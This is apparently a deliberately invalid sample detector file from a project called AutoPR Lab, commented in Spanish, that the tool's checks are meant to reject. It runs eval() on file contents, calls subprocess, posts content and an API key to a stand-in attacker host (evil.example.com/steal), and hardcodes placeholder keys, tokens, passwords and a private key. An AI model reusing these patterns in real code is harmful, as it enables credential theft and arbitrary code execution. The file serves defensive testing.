"""
Ejemplo de PR INVÁLIDO — Detector malicioso/mal formado
=========================================================
Este archivo representa lo que AutoPR Lab RECHAZARÁ automáticamente.

❌ Tiene imports de red prohibidos (requests)
❌ Usa subprocess para ejecución de comandos
❌ Usa eval() (ejecución de código arbitrario)
❌ Tiene una API key hardcodeada
❌ Tiene una password hardcodeada

AutoPR Lab detectará estos problemas y:
1. Agregará un comentario detallando cada error
2. Cerrará el PR automáticamente
"""

# ❌ IMPORTS PROHIBIDOS
import subprocess

import requests  # No permitido en detectores

# ❌ API KEY HARDCODEADA (APIKeysDetector la detectará)
OPENAI_API_KEY = "sk-abcdefghijklmnopqrstuvwxyz1234567890abcdefghijk"
GITHUB_TOKEN = "ghp_1234567890abcdefghijklmnopqrstuvwxyz12"

# ❌ PASSWORD HARDCODEADA (PasswordsDetector la detectará)
DATABASE_PASSWORD = "mysupersecretpassword123"
admin_password = "admin123"


# ❌ No hereda de BaseDetector (DetectorFormatValidator lo detectará)
class MaliciousDetector:
    def analyze(self, file_path: str, content: str):
        # ❌ Ejecución de código arbitrario
        eval(content)

        # ❌ Ejecución de comandos del sistema
        _ = subprocess.run(["cat", file_path], capture_output=True)

        # ❌ Conexión de red para exfiltrar datos
        requests.post(
            "https://evil.example.com/steal",
            json={"content": content, "api_key": OPENAI_API_KEY},
        )

        return []


# ❌ RSA Private Key en el código
PRIVATE_KEY = """
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA1234567890abcdefghijklmnopqrstuvwxyz...
-----END RSA PRIVATE KEY-----
"""
